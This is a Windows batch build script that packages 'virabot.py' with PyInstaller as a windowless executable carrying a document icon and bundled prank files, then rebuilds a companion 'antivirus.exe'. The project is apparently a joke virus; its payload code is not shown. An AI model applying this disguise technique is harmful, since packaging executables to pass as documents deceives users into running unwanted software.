cd exe
start ./antivirus.exe
timeout /t 15 /nobreak
cd ..
del /f /s /q exe 1>nul

pyinstaller --noconsole --onefile --add-data "trollface.png;." --add-data "CALMDOWN.doc;." --icon=docs.ico virabot.py
del virabot.spec
del /f /s /q build 1>nul
rmdir /s /q build
cd dist
move virabot.exe ../exe
cd ..
rmdir dist

python insert_hash.py
cd exe
del antivirus.exe
cd ..

pyinstaller --onefile antivirus_temp.py
del antivirus_temp.spec
del /f /s /q build 1>nul
rmdir /s /q build
cd dist
move antivirus_temp.exe ../exe
cd ..
rmdir dist
cd exe
rename antivirus_temp.exe antivirus.exe
cd ..
del antivirus_temp.py